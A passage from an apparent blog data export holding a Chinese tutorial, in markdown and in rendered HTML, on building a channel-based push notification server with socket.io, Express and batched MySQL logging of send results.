channel.lastIndexOf( '_' ) + 1 )\n    // 将消息发送结果存入等待持久化的队列\n    pushArrayAdd( {\n      channel,\n      status,\n      send_content: JSON.stringify( content ),\n      push_date: Date.now(),\n      event_type: event,\n      platform\n    } )\n  }\n\n  return new Promise( ( resolve ) => {\n    let retry = retryTimes\n    let timeID = setTimeout( function sendTimeout() {\n      if ( !retry ) {\n        resolve( 10000 )\n        pushDBData( 0 )\n      } else {\n        retry--\n        sendTimeout()\n        console.log( `${new Date}用户“${channel}”消息发送超时` )\n      }\n    }, sendTimeout )\n    socket.emit( 'message', content, function() {\n      resolve( 0 )\n      clearTimeout( timeID )\n      pushDBData( 1 )\n    } )\n  } ).catch( err => { throw new Error( err ) } )\n}\n```\n对消息发送，超出时间未收到客户端的响应递归尝试N次，一直失败则判定为失败。这里的10000和0都是对接口请求者的响应码。\n接下来是对发送记录的入库\n```js\nexports.pushArrayAdd = function( pushItem ) {\n  pushArray.push( pushItem )\n  if ( pushArray.length >= 100 ) {\n    console.log(`插入数据库${new Date}`)\n    // 每一百条数据清空一次\n    staistical.insertPushRecord( _.cloneDeep( pushArray ) )\n    pushArray = []\n  }\n}\n```\n`pushArray`肯定是一个单例模式的数据，也就是我们的`dataStore`，我们肯定不能发一条就存一条，这也不专业，定时储存或达到一个量再储存是比较为数据库着想的。如果消息推送得少我们可以再启动一个定时器定时去清空一次这个队列，防止数据过久存放在内存里导致更新不及时，或服务重启导致的数据丢失。\n接下来就是数据库的写入操作了，nodejs发展到今天生态已经很好了，对mysql进行操作的包与其同名，不过操作起来感觉还是过于简陋，对于`connection`都是手动拿手动释放。不过连接池这一块貌似很方便。期间用到了非常非常多的回调，mysql这个包也没有提供Promise返回（我猜的，官方推荐是回调的形式），还好我用的nodejs版本比较高，我便优雅的全部封装成Promise返回了，方便我调用，于是像`query、insert`这样的函数我就直接声明成`asycn`函数了\n```js\nconst mysql = require( 'mysql' )\nconst { mysql: mysqlConfig } = require( '../config' )\nconst pool = mysql.createPool( mysqlConfig )\n/**\n * 获取连接池中的连接\n */\nmodule.exports = class DBBase {\n\n  /**\n   * 获取数据库连接\n   */\n  getConnection() {\n    return new Promise( ( resolve, reject ) => {\n      pool.getConnection( ( err, connection ) => ( err ? reject( err ) : resolve( connection ) ) )\n    } ).catch( err => {\n      console.log( err )\n    } )\n  }\n\n  /**\n   * 查询记录\n   * \n   * @param {*} sql \n   * @param {*} condition \n   */\n  async query( sql, condition ) {\n    let con = await this.getConnection()\n    return new Promise( ( resolve, reject ) => {\n      con.query( sql, condition, ( err, result ) => {\n        err ? reject( err ) : resolve( result )\n        con.release()\n      } )\n    } )\n  }\n\n  /**\n   * 插入记录\n   * \n   * @param {*} sql \n   * @param {*} dataArray \n   */\n  insert( sql, dataArray ) {\n    return this.query( sql, [ dataArray ] )\n  }\n}\n\n```\n这是所有需要有数据库操作的对象的基类，这样一来我所有的操作就不用再去手动取连接，用完再释放了，下面是继承它的子类的一些简单操作\n```js\nclass StatisticalDao extends DBBase {\n  constructor() {\n    super()\n  }\n\n  async insertPushRecord( arr ) {\n    \n    let insertData = arr.map( item => ( [\n      item.push_date,\n      item.send_content,\n      item.status,\n      item.channel,\n      item.event_type,\n      item.platform\n    ] ) )\n\n    return await this.insert( `insert into bigwe_notification_records( \n      push_date, \n      send_content, \n      status,\n      channel,\n      event_type,\n      platform\n    ) values ?`,\n      insertData )\n  }\n}\n\nmodule.exports = new StatisticalDao()\n```\n哈，Dao的结尾命名纯属情怀，想起了写java的时光。这里的`insertPushRecord`方法就是上面对队列里的数据操作时调用的方法，批量插入数据。\n其实在接收来此接口请求者post过来的数据的时候还有点小插曲，先是get取得到post取不到于是加了这句\n```js\nconst bodyParser = require( 'body-parser' )\n\napp.use( bodyParser.json() )\napp.use( bodyParser.urlencoded( { extended: true } ) )\n```\nhtml端post取到了，后面模拟真实后端post，又取不到了，原来是格式原因，`jquery`默认了我们的json格式于是以application/json的格式post，而后端的post是以`form`的格式post，于是又引入了\n```js\nconst connectMultiparty = require( 'connect-multiparty' )\napp.post( '/publish', connectMultiparty(), routerHandler.publish( io ) )\n```\n这样来处理form数据，真是坎坷啊。\n\n以上则是服务端的大致情况，当然，这仅仅是能完成推送服务，还有在线人数统计等需要慢慢完善的功能。\n客户端的代码则相当简单了，提供一个订阅函数就好了，并且在代码里记得`ws`断线重连后重新login，不然就接收不到消息了。\n完整的代码整理后会放到github，敬请期待~ 😄","slug":"node-websocket-server","published":1,"updated":"2018-01-10T03:16:03.869Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjw1000ni4ucxkyuma9z","content":"<p>上一次说<code>websocket</code>还是在“<a href=\"/2017/09/12/page-parallel-execute\">解决Websocket并发执行的问题</a>”这篇文章，不过提到的内容是在不同标签页的消息同时到来时的处理方式，不过治标不治本，还是有几率出现重复推送的问题，而且这样的代码也不是很严谨，所以这个问题只能从服务端着手了。其实在很早之前就看过<code>goeasy</code>这个第三方推送服务的<code>client</code>源码，当时就吐槽它们代码之烂，二次封装的代码居然直接修改了<code>socket.io</code>（goeasy是基于nodejs的开源库<a href=\"http://socket.io\" target=\"_blank\" rel=\"noopener\">socket.io</a>来做的）的源码，然后添加了自己的代码，再将<code>goeasy</code>构造函数强行暴露给window，据说是为了适配不同了浏览器要求一定要动态引用他们的js代码，我猜应该是做了cdn处理吧，可恶的是还拒绝缓存，所以有时候会造成我们网站一直等待goeasy的js代码。扯远了，还是说说我们自己如何去构建一个基于channel的推送服务吧。</p>\n<p><code>socoket.io</code>这个库把自己封装得更像是一个聊天室，甚至里面的有属性也命名为<code>room</code>（若理解错误还请轻喷）。我们的网页应用更侧重于按用户id接收来自服务器的消息推送，因为可能存在多个标签页，所以就可能反复的订阅消息，这也是导致上面我的提到的重复推送的问题，因为我们是基于h5的<code>Notification</code>来做的，网页一旦都接收消息，就会出现几个标签页，收到几次桌面通知的问题。所以，我也是直接吸收了goeasy的设计思路，直接按channel来订阅和发送消息。文档都是摆在那儿的，网上零零碎碎的教程也不系统化，还是只能看官方文档，英语不到位也只能看会儿机翻的结果再适当切回去。</p>\n<p>我采用的是<code>socket.io + express 4</code>的模式，其实要将二者结合起来还是非常简单的</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> app = <span class=\"built_in\">require</span>( <span class=\"string\">'express'</span> )();</span><br><span class=\"line\"><span class=\"keyword\">var</span> server = <span class=\"built_in\">require</span>( <span class=\"string\">'http'</span> ).createServer( app );</span><br><span class=\"line\"><span class=\"keyword\">var</span> io = <span class=\"built_in\">require</span>( <span class=\"string\">'socket.io'</span> )( server );</span><br><span class=\"line\">server.listen( <span class=\"number\">3000</span> );</span><br></pre></td></tr></table></figure>\n<p>主要还是在<code>io</code>这里，我们需要处理来自客户端的连接事件</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">io.on( <span class=\"string\">'connection'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> socket </span>) </span>&#123;</span><br><span class=\"line\">  socket</span><br><span class=\"line\">    .on( <span class=\"string\">'login'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> &#123; channel, socketDeviceID &#125; </span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"comment\">// 这里至关重要，我们用这个标记这个连接是否来自同一个浏览器</span></span><br><span class=\"line\">      socket.socketDeviceID = socketDeviceID</span><br><span class=\"line\">      <span class=\"comment\">// 将这个连接合并到channel这个频道，也就是用户id</span></span><br><span class=\"line\">      socket.join( channel )</span><br><span class=\"line\">    &#125; )</span><br><span class=\"line\">    .on( <span class=\"string\">'message'</span>, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> content </span>) </span>&#123;</span><br><span class=\"line\">      messageSend( io, content )</span><br><span class=\"line\">    &#125; )</span><br><span class=\"line\">&#125; )</span><br></pre></td></tr></table></figure>\n<p>其实这里很简单，就是监听客户端连接，然后再监听当前连接的login事件，再自动合并相同用户的连接。<br>\n为了方便理解再贴上客户端代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> io <span class=\"keyword\">from</span> <span class=\"string\">'socket.io-client'</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> socket = io( <span class=\"string\">'localhost:3000'</span> )</span><br><span class=\"line\"></span><br><span class=\"line\">soket.emit( <span class=\"string\">'login'</span>, &#123;</span><br><span class=\"line\">  channel: <span class=\"string\">'user1'</span>,</span><br><span class=\"line\">  socketDeviceID: <span class=\"string\">'xxxxxxx'</span> <span class=\"comment\">// 这里是一个随机字符串，反正能尽量保证当前浏览器的唯一性就好了</span></span><br><span class=\"line\">&#125; )</span><br></pre></td></tr></table></figure>\n<p>客户端也很简单吧。<br>\n其实麻烦的是我们要处理消息的发送就是上面的<code>messageSend</code>函数要做的事，<code>content</code>的结构因该是</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">\"channel\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"content\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"ak\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>用户id，发送内容和<code>application key</code>，ak是为了防止别人恶意调用。<br>\n上面的<code>message</code>事件只是为了后面的客户端提交，我们的程序服务端要发送事件应该提供更友好的发送方式，所以我们就需要一个url来提供api形式的推送<code>express</code>的路由就不赘述了，因为不是本篇文章的讲述内容。下面是<code>/publish</code>接口的处理函数</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">messageSend( io, &#123; channel, content, ak &#125; ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( ak !== <span class=\"string\">'ak'</span> ) <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.resolve( <span class=\"number\">10001</span> )</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !channel || !content ) <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.resolve( <span class=\"number\">10002</span> )</span><br><span class=\"line\">  <span class=\"keyword\">let</span> &#123; event &#125; = <span class=\"keyword\">typeof</span> content !== <span class=\"string\">'object'</span> ? <span class=\"built_in\">JSON</span>.parse( content ) : content</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>( <span class=\"function\">(<span class=\"params\"> resolve, reject </span>) =&gt;</span> &#123;</span><br><span class=\"line\">    io.to( channel ).clients( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> err, clients </span>) </span>&#123;</span><br><span class=\"line\">      err &amp;&amp; reject( err )</span><br><span class=\"line\">      <span class=\"keyword\">let</span> &#123; connected &#125; = io.of( <span class=\"string\">'/'</span> )</span><br><span class=\"line\">      <span class=\"keyword\">let</span> promiseArray = []</span><br><span class=\"line\">      <span class=\"comment\">// 我们在这里单独处理message类型的事件</span></span><br><span class=\"line\">      <span class=\"comment\">// ps: 推往客户端的内容有一个规范，event字段为必须项，用来描述内容的类型，messge|refresh等</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( event === <span class=\"string\">'message'</span> ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> names = &#123;&#125;</span><br><span class=\"line\">        <span class=\"comment\">// 在这里将来自同一个浏览器的连接进行合并，取最后连接上的那个连接</span></span><br><span class=\"line\">        clients.forEach( <span class=\"function\"><span class=\"params\">item</span> =&gt;</span> names[ connected[ item ].socketDeviceID ] = item )</span><br><span class=\"line\">        <span class=\"comment\">// 填充消息进行发送</span></span><br><span class=\"line\">        promiseArray = <span class=\"built_in\">Object</span>.keys( names ).map( <span class=\"function\"><span class=\"params\">key</span> =&gt;</span> messageEmit( connected[ names[ key ] ], channel, content ) )</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        promiseArray = clients.map( <span class=\"function\"><span class=\"params\">clientId</span> =&gt;</span> messageEmit( connected[ clientId ], channel, content ) )</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"comment\">// 将消息一并发送出去 </span></span><br><span class=\"line\">      <span class=\"comment\">// TODO，应将0以外的消息进行筛选</span></span><br><span class=\"line\">      <span class=\"built_in\">Promise</span>.all( promiseArray ).then( <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> resolve( <span class=\"number\">0</span> ) )</span><br><span class=\"line\">    &#125; )</span><br><span class=\"line\">  &#125; )</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这是对消息的发送对象进行处理，下面是发送逻辑</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 发送消息，延迟N秒后告知发送失败</span></span><br><span class=\"line\"><span class=\"comment\"> * @param &#123;*&#125; socket </span></span><br><span class=\"line\"><span class=\"comment\"> * @param &#123;*&#125; content </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">messageEmit</span>(<span class=\"params\"> socket, channel, content </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> &#123; event &#125; = <span class=\"keyword\">typeof</span> content !== <span class=\"string\">'object'</span> ? <span class=\"built_in\">JSON</span>.parse( content ) : content</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pushDBData</span>(<span class=\"params\"> status </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> platform = channel.substr( channel.lastIndexOf( <span class=\"string\">'_'</span> ) + <span class=\"number\">1</span> )</span><br><span class=\"line\">    <span class=\"comment\">// 将消息发送结果存入等待持久化的队列</span></span><br><span class=\"line\">    pushArrayAdd( &#123;</span><br><span class=\"line\">      channel,</span><br><span class=\"line\">      status,</span><br><span class=\"line\">      send_content: <span class=\"built_in\">JSON</span>.stringify( content ),</span><br><span class=\"line\">      push_date: <span class=\"built_in\">Date</span>.now(),</span><br><span class=\"line\">      event_type: event,</span><br><span class=\"line\">      platform</span><br><span class=\"line\">    &#125; )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>( <span class=\"function\">(<span class=\"params\"> resolve </span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> retry = retryTimes</span><br><span class=\"line\">    <span class=\"keyword\">let</span> timeID = setTimeout( <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">sendTimeout</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( !retry ) &#123;</span><br><span class=\"line\">        resolve( <span class=\"number\">10000</span> )</span><br><span class=\"line\">        pushDBData( <span class=\"number\">0</span> )</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        retry--</span><br><span class=\"line\">        sendTimeout()</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log( <span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>&#125;</span>用户“<span class=\"subst\">$&#123;channel&#125;</span>”消息发送超时`</span> )</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;, sendTimeout )</span><br><span class=\"line\">    socket.emit( <span class=\"string\">'message'</span>, content, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      resolve( <span class=\"number\">0</span> )</span><br><span class=\"line\">      clearTimeout( timeID )</span><br><span class=\"line\">      pushDBData( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#125; )</span><br><span class=\"line\">  &#125; ).catch( <span class=\"function\"><span class=\"params\">err</span> =&gt;</span> &#123; <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>( err ) &#125; )</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对消息发送，超出时间未收到客户端的响应递归尝试N次，一直失败则判定为失败。这里的10000和0都是对接口请求者的响应码。<br>\n接下来是对发送记录的入库</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exports.pushArrayAdd = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> pushItem </span>) </span>&#123;</span><br><span class=\"line\">  pushArray.push( pushItem )</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( pushArray.length &gt;= <span class=\"number\">100</span> ) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">`插入数据库<span class=\"subst\">$&#123;<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>&#125;</span>`</span>)</span><br><span class=\"line\">    <span class=\"comment\">// 每一百条数据清空一次</span></span><br><span class=\"line\">    staistical.insertPushRecord( _.cloneDeep( pushArray ) )</span><br><span class=\"line\">    pushArray = []</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>pushArray</code>肯定是一个单例模式的数据，也就是我们的<code>dataStore</code>，我们肯定不能发一条就存一条，这也不专业，定时储存或达到一个量再储存是比较为数据库着想的。如果消息推送得少我们可以再启动一个定时器定时去清空一次这个队列，防止数据过久存放在内存里导致更新不及时，或服务重启导致的数据丢失。<br>\n接下来就是数据库的写入操作了，nodejs发展到今天生态已经很好了，对mysql进行操作的包与其同名，不过操作起来感觉还是过于简陋，对于<code>connection</code>都是手动拿手动释放。不过连接池这一块貌似很方便。期间用到了非常非常多的回调，mysql这个包也没有提供Promise返回（我猜的，官方推荐是回调的形式），还好我用的nodejs版本比较高，我便优雅的全部封装成Promise返回了，方便我调用，于是像<code>query、insert</code>这样的函数我就直接声明成<code>asycn</code>函数了</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> mysql = <span class=\"built_in\">require</span>( <span class=\"string\">'mysql'</span> )</span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; <span class=\"attr\">mysql</span>: mysqlConfig &#125; = <span class=\"built_in\">require</span>( <span class=\"string\">'../config'</span> )</span><br><span class=\"line\"><span class=\"keyword\">const</span> pool = mysql.createPool( mysqlConfig )</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 获取连接池中的连接</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DBBase</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">   * 获取数据库连接</span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  getConnection() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>( <span class=\"function\">(<span class=\"params\"> resolve, reject </span>) =&gt;</span> &#123;</span><br><span class=\"line\">      pool.getConnection( <span class=\"function\">(<span class=\"params\"> err, connection </span>) =&gt;</span> ( err ? reject( err ) : resolve( connection ) ) )</span><br><span class=\"line\">    &#125; ).catch( <span class=\"function\"><span class=\"params\">err</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log( err )</span><br><span class=\"line\">    &#125; )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">   * 查询记录</span></span><br><span class=\"line\"><span class=\"comment\">   * </span></span><br><span class=\"line\"><span class=\"comment\">   * @param &#123;*&#125; sql </span></span><br><span class=\"line\"><span class=\"comment\">   * @param &#123;*&#125; condition </span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  <span class=\"keyword\">async</span> query( sql, condition ) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> con = <span class=\"keyword\">await</span> <span class=\"keyword\">this</span>.getConnection()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>( <span class=\"function\">(<span class=\"params\"> resolve, reject </span>) =&gt;</span> &#123;</span><br><span class=\"line\">      con.query( sql, condition, ( err, result ) =&gt; &#123;</span><br><span class=\"line\">        err ? reject( err ) : resolve( result )</span><br><span class=\"line\">        con.release()</span><br><span class=\"line\">      &#125; )</span><br><span class=\"line\">    &#125; )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">   * 插入记录</span></span><br><span class=\"line\"><span class=\"comment\">   * </span></span><br><span class=\"line\"><span class=\"comment\">   * @param &#123;*&#125; sql </span></span><br><span class=\"line\"><span class=\"comment\">   * @param &#123;*&#125; dataArray </span></span><br><span class=\"line\"><span class=\"comment\">   */</span></span><br><span class=\"line\">  insert( sql, dataArray ) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.query( sql, [ dataArray ] )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这是所有需要有数据库操作的对象的基类，这样一来我所有的操作就不用再去手动取连接，用完再释放了，下面是继承它的子类的一些简单操作</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">StatisticalDao</span> <span class=\"keyword\">extends</span> <span class=\"title\">DBBase</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>()</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">async</span> insertPushRecord( arr ) &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">let</span> insertData = arr.map( <span class=\"function\"><span class=\"params\">item</span> =&gt;</span> ( [</span><br><span class=\"line\">      item.push_date,</span><br><span class=\"line\">      item.send_content,</span><br><span class=\"line\">      item.status,</span><br><span class=\"line\">      item.channel,</span><br><span class=\"line\">      item.event_type,</span><br><span class=\"line\">      item.platform</span><br><span class=\"line\">    ] ) )</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">await</span> <span class=\"keyword\">this</span>.insert( <span class=\"string\">`insert into bigwe_notification_records( </span></span><br><span class=\"line\"><span class=\"string\">      push_date, </span></span><br><span class=\"line\"><span class=\"string\">      send_content, </span></span><br><span class=\"line\"><span class=\"string\">      status,</span></span><br><span class=\"line\"><span class=\"string\">      channel,</span></span><br><span class=\"line\"><span class=\"string\">      event_type,</span></span><br><span class=\"line\"><span class=\"string\">      platform</span></span><br><span class=\"line\"><span class=\"string\">    ) values ?`</span>,</span><br><span class=\"line\">      insertData )</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = <span class=\"keyword\">new</span> StatisticalDao()</span><br></pre></td></tr></table></figure>\n<p>哈，Dao的结尾命名纯属情怀，想起了写java的时光。这里的<code>insertPushRecord</code>方法就是上面对队列里的数据操作时调用的方法，批量插入数据。<br>\n其实在接收来此接口请求者post过来的数据的时候还有点小插曲，先是get取得到post取不到于是加了这句</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> bodyParser = <span class=\"built_in\">require</span>( <span class=\"string\">'body-parser'</span> )</span><br><span class=\"line\"></span><br><span class=\"line\">app.use( bodyParser.json() )</span><br><span class=\"line\">app.use( bodyParser.urlencoded( &#123; <span class=\"attr\">extended</span>: <span 